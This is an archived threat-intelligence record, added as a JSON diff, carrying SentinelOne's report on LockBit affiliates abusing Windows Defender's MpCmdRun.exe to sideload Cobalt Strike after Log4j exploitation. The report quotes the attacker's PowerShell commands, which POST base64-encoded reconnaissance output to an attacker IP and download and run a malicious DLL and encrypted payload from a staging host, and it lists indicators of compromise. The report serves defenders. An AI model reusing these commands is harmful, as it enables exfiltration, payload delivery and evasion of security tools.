@@ -1,0 +1,62 @@
+{
+    "id": "1a7425c7-2f2e-4eea-849c-56cc660e56f5",
+    "created_at": "2023-01-12T15:01:08.322874Z",
+    "updated_at": "2025-03-27T02:09:18.00337Z",
+    "deleted_at": null,
+    "sha1_hash": "f44ff753779a041ad2e071fd4a3e3d1fadf29ed2",
+    "title": "2022-07-28 - Living Off Windows Defender - LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool",
+    "authors": "",
+    "file_creation_date": "2022-08-18T03:50:02Z",
+    "file_modification_date": "2022-08-18T03:50:02Z",
+    "file_size": 448701,
+    "plain_text": "# Living Off Windows Defender | LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool\n\n**sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-**\nsecurity-tool/\n\nJuly 28, 2022\n\nLockBit has been receiving a fair share of attention recently. Last week, SentinelLabs\n[reported on LockBit 3.0 (aka LockBit Black), describing how the latest iteration of this](https://www.sentinelone.com/labs/lockbit-3-0-update-unpicking-the-ransomwares-latest-anti-analysis-and-evasion-techniques/)\nincreasingly prevalent RaaS implemented a series of anti-analysis and anti-debugging\n[routines. Our research was quickly followed up by others reporting similar findings.](https://www.trendmicro.com/en_us/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)\nMeanwhile, back in April, SentinelLabs reported on how a LockBit affiliate was leveraging the\n[legitimate VMware command line utility,](https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/) `VMwareXferlogs.exe, in a live engagement to`\nside load Cobalt Strike.\n\nIn this post, we follow up on that incident by describing the use of another legitimate tool\nused to similar effect by a LockBit operator or affiliate, only this time the tool in question turns\nout to belong to a security tool: Windows Defender. During a recent investigation, we found\nthat threat actors were abusing the Windows Defender command line tool `MpCmdRun.exe`\nto decrypt and load Cobalt Strike payloads.\n\n\n-----\n\n## Overview\n\n[The initial target compromise happened via the Log4j vulnerability against an unpatched](https://www.sentinelone.com/blog/cve-2021-44228-staying-secure-apache-log4j-vulnerability/)\nVMWare Horizon Server. The attackers modified the Blast Secure Gateway component of\n[the application installing a web shell using PowerShell code found documented here.](https://www.sprocketsecurity.com/blog/crossing-the-log4j-horizon-a-vulnerability-with-no-return)\n\nOnce initial access had been achieved, the threat actors performed a series of enumeration\ncommands and attempted to run multiple post-exploitation tools, including Meterpreter,\nPowerShell Empire and a new way to side-load Cobalt Strike.\n\nIn particular, when attempting to execute Cobalt Strike we observed a new legitimate tool\nused for side-loading a malicious DLL, that decrypts the payload.\n\n[Previously observed techniques to evade defenses by removing EDR/EPP’s userland hooks,](https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/)\nEvent Tracing for Windows and Antimalware Scan Interface were also observed.\n\n## Attack Chain\n\n\n-----\n\nOnce the attackers gained initial access via the Log4j vulnerability, reconnaissance began\nusing [PowerShell to execute commands and exfiltrate the command output via a POST](https://www.sentinelone.com/cybersecurity-101/windows-powershell/)\nbase64 encoded request to an IP. Examples of the reconnaissance activity can be seen\nbelow:\n```\npowershell -c curl -uri http://139.180.184[.]147:80 -met POST -Body\n([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((whoami)))))\n -c curl -uri http://139.180.184[.]147:80 -met POST -Body\n([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((nltest\n/domain_trusts)))))\n\n\n```\nOnce the threat actor acquired sufficient privileges, they attempted to download and execute\nmultiple post-exploitation payloads.\n\nThe threat actor downloads a malicious DLL, the encrypted payload and the legitimate tool\nfrom their controlled C2:\n\n\n-----\n\n```\npowershell c Invoke WebRequest uri http://45.32.108[.]54:443/mpclient.dll OutFile\nc:\\windows\\help\\windows\\mpclient.dll;Invoke-WebRequest -uri\nhttp://45.32.108[.]54:443/c0000015.log -OutFile\nc:\\windows\\help\\windows\\c0000015.log;Invoke-WebRequest -uri\nhttp://45.32.108[.]54:443/MpCmdRun.exe -OutFile\nc:\\windows\\help\\windows\\MpCmdRun.exe;c:\\windows\\help\\windows\\MpCmdRun.exe\n\n```\nNotably, the threat actor leverages the legitimate Windows Defender command line tool\n```\nMpCmdRun.exe to decrypt and load Cobalt Strike payloads.\n\n```\nWe also note the correlation between the IP address used to download the Cobalt Strike\npayload and the IP address used to perform reconnaissance: shortly after downloading\nCobalt Strike the threat actor tried to execute and send the output to the IP starting with 139,\nas can be seen in both snippets below.\n```\npowershell -c Invoke-WebRequest -uri http://45.32.108[.]54:443/glib-2.0.dll -OutFile\nc:\\users\\public\\glib-2.0.dll;Invoke-WebRequest -uri\nhttp://45.32.108[.]54:443/c0000013.log -OutFile c:\\users\\public\\c0000013.log;InvokeWebRequest -uri http://45.32.108[.]54:443/VMwareXferlogs.exe -OutFile\nc:\\users\\public\\VMwareXferlogs exe;c:\\users\\public\\VMwareXferlogs exe\n\n```\n\n-----\n\n```\npowershell c curl uri http://139.180.184[.]147:80 met POST Body\n([System.Convert]::ToBase64String(([System.Text.Encoding]::ASCII.GetBytes((c:\\users\\pu\n\n```\nFollowing the same flow as the sideloading of the `VMwareXferlogs.exe utility reported on`\n[previously,](https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility/) `MpCmd.exe is abused to side-load a weaponized` `mpclient.dll, which loads`\nand decrypts Cobalt Strike Beacon from the `c0000015.log file.`\n\nAs such, the components used in the attack specifically related to the use of the Windows\nDefender command line tool are:\n\n**Filename** **Description**\n\nmpclient.dll Weaponized DLL loaded by MpCmdRun.exe\n\nMpCmdRun.exe Legitimate/signed Microsoft Defender utility\n\nC0000015.log Encrypted Cobalt Strike payload\n\n## Conclusion\n\nDefenders need to be alert to the fact that LockBit ransomware operators and affiliates are\nexploring and exploiting novel “living off the land” tools to aid them in loading Cobalt Strike\nbeacons and evading some common EDR and traditional AV detection tools.\n\nImportantly, tools that should receive careful scrutiny are any that either the organization or\nthe organization’s security software have made exceptions for. Products like VMware and\nWindows Defender have a high prevalence in the enterprise and a high utility to threat actors\nif they are allowed to operate outside of the installed security controls.\n\n## Indicators of Compromise\n\n**IoC** **Description**\n\na512215a000d1b21f92dbef5d8d57a420197d262 Malicious glib-2.0.dll\n\n729eb505c36c08860c4408db7be85d707bdcbf1b Malicious glib-2.0.dll\n\n10039d5e5ee5710a067c58e76cd8200451e54b55 Malicious glib-2.0.dll\n\nff01473073c5460d1e544f5b17cd25dadf9da513 Malicious glib-2.0.dll\n\ne35a702db47cb11337f523933acd3bce2f60346d Encrypted Cobalt Strike payload –\nc0000015.log\n\n82bd4273fa76f20d51ca514e1070a3369a89313b Encrypted Cobalt Strike payload –\nc0000015.log\n\n\n-----\n\n091b490500b5f827cc8cde41c9a7f68174d11302 Decrypted Cobalt Strike payload –\nc0000015.log\n\n0815277e12d206c5bbb18fd1ade99bf225ede5db Encrypted Cobalt Strike payload –\nc0000013.log\n\need31d16d3673199b34b48fb74278df8ec15ae33 Malicious mpclient.dll\n\n149.28.137[.]7 Cobalt Strike C2\n\n45.32.108[.]54 IP where the attacker staged the\nmalicious payloads to be downloaded\n\n139.180.184[.]147 Attacker C2 used to receive data from\nexecuted commands\n\ninfo.openjdklab[.]xyz Domain used by the mpclient.dll\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-28 - Living Off Windows Defender - LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool.pdf"
+    ],
+    "report_names": [
+        "2022-07-28 - Living Off Windows Defender - LockBit Ransomware Sideloads Cobalt Strike Through Microsoft Security Tool.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535668,
+    "ts_updated_at": 1743041358,
+    "ts_creation_date": 1660794602,
+    "ts_modification_date": 1660794602,
+    "files": {
+        "pdf": "https://archive.orkl.eu/f44ff753779a041ad2e071fd4a3e3d1fadf29ed2.pdf",
+        "text": "https://archive.orkl.eu/f44ff753779a041ad2e071fd4a3e3d1fadf29ed2.txt",
+        "img": "https://archive.orkl.eu/f44ff753779a041ad2e071fd4a3e3d1fadf29ed2.jpg"
+    }
+}
